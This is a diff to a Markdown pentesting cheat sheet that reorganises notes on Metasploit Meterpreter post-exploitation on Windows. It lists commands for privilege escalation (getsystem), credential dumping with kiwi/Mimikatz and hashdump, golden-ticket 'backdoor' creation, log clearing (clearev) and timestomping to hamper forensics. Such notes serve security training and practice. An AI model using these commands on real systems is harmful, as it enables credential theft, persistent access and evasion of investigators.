@@ -175,47 +175,56 @@ msf6 exploit('module_used') > sessions -i 1
 
 <div class="row row-cols-md-2"><div>
 
-You can use many Linux commands
+* See if you are root / your privileges
 
 ```bash
-meterpreter > ls # list files
-meterpreter > cd # move
-meterpreter > pwd # path to current folder
-meterpreter > cat file # print file
-meterpreter > edit file # open file in vim
-meterpreter > ps # see running processes
-meterpreter > exit
+meterpreter > getuid
+# Server username: NT AUTHORITY\SYSTEM
+# it you see that, you're admin 😎
+meterpreter > getprivs
+# see your privileges
 ```
 
-And there are quite a lof of useful "post" modules
+* Try automatic privilege escalation 😎. Look [at this article](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/) if it fails, and you want to give another try.
+
+```bash
+meterpreter > getsystem
+```
+
+Learn more about the system. It could be useful to find exploit, for instance by looking for CVE given the Windows build. The architecture can help too, because some scripts work better on some architectures.
 
 ```bash
 meterpreter > sysinfo
-# Use the build xxx to find exploits
-# Use the architecture to find if there are compatible...
-# ...
 # Computer        : XXX-PC
 # OS              : Windows X (... Build xxx...).
 # Architecture    : x64
-# System Language : en_US
-# Domain          : WORKGROUP
-# Logged On Users : 2
-# Meterpreter     : x86/windows
-meterpreter > getuid
-# NT... means that you're an admin
-# Server username: NT AUTHORITY\SYSTEM
-meterpreter > getprivs
-# see your privileges
+```
+</div><div>
+
+You can also start a shell, and directly asks Windows
+
+```bash
 meterpreter > shell # start a shell
 # you can run commands
 # C:\WINDOWS\system32> whoami
 # C:\WINDOWS\system32> systeminfo
-meterpreter > run post/multi/recon/local_exploit_suggester
-# suggest exploits
-# this doesn't work well on x64
 ```
 
-Note: you can use `sessions sid` in the meterpreter, which is like `sessions -i sid` in the msfconsole. You can use `background` to go back to the msfconsole, for instance, to run another exploit.
+You can ask for suggested exploits <small>(this doesn't work well on x64)</small>
+
+```bash
+meterpreter > run post/multi/recon/local_exploit_suggester
+```
+
+If you found once, use `background` to go back to the console, and try an additional exploit.
+
+</div></div>
+
+<hr class="sl">
+
+## Not-admin yet
+
+<div class="row row-cols-md-2"><div>
 
 To access a service, we need to be "in" a process that has the same architecture, and the same permissions, that our target. Usually, look for process run by "NT AUTHORITY\SYSTEM" (root).
 
@@ -225,27 +234,18 @@ meterpreter > migrate process_pid # move to another process
 meterpreter > migrate -N process_name # same
 ```
 
-<details class="details-e">
-<summary>Dump in-memory password with Mimikatz/Kiwi</summary>
+You can dump in-memory passwords
 
 ```bash
 meterpreter > load kiwi
-meterpreter > creds_all # retrieve all credentials
+meterpreter > migrate some_process_nt_system_compatible
+# retrieve all credentials
+meterpreter > creds_all
 # later, you may use it to create a "backdoor"
 meterpreter > golden_ticket_create
 ```
-</details>
+
 </div><div>
-
-Once/if you are admin,
-
-```bash
-meterpreter > getsystem
-meterpreter > hashdump # dump usernames/password...
-# try to bruteforce NTML with john format=nt
-meterpreter > clearev # clean logs
-meterpreter > timestomp # modify timestamp to complicate forensics
-```
 
 Other commands
 
@@ -258,10 +258,24 @@ meterpreter > download c:\\path # download to your machine
 meterpreter > upload local_file c:\\path # upload
 ```
 
+<details class="details-e">
+<summary>You can use many Linux commands</summary>
+
+```bash
+meterpreter > ls # list files
+meterpreter > cd # move
+meterpreter > pwd # path to current folder
+meterpreter > cat file # print file
+meterpreter > edit file # open file in vim
+meterpreter > ps # see running processes
+meterpreter > exit
+```
+</details>
+
 <details class="details-e mt-4">
 <summary>Load a file with commands</summary>
 
-You can use resources to load a resource on the target
+You can use `lpwd`, and `lcd` to move on your local machine. Then, you can use `resource` to execute a suite of meterpreter commands.
 
 ```bash
 meterpreter > lpwd
@@ -271,6 +285,33 @@ meterpreter > lcd path
 meterpreter > resource file.txt # with commands inside
 ```
 </details>
+</div></div>
+
+<hr class="sr">
+
+## As an admin
+
+<div class="row row-cols-md-2"><div>
+
+Dump every username/password store by the system, they are hashed, you need to use `john` with `format=nt` to try bruteforce NTML hashes. It worth noting that you can use the [hash](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).
+
+```bash
+meterpreter > hashdump
+```
+
+Clear logs
+
+```bash
+meterpreter > clearev
+```
+
+Mess with timestamp to complicate forensics/investigations
+
+```bash
+meterpreter > timestomp
+```
+</div><div>
+
 
 <details class="details-e">
 <summary>Take control of the webcam</summary>
@@ -333,7 +374,7 @@ meterpreter > run post/windows/manage/enable_rdp
 </details>
 </div></div>
 
-<hr class="sr">
+<hr class="sl">
 
 ## msfconsole, and nessus
 
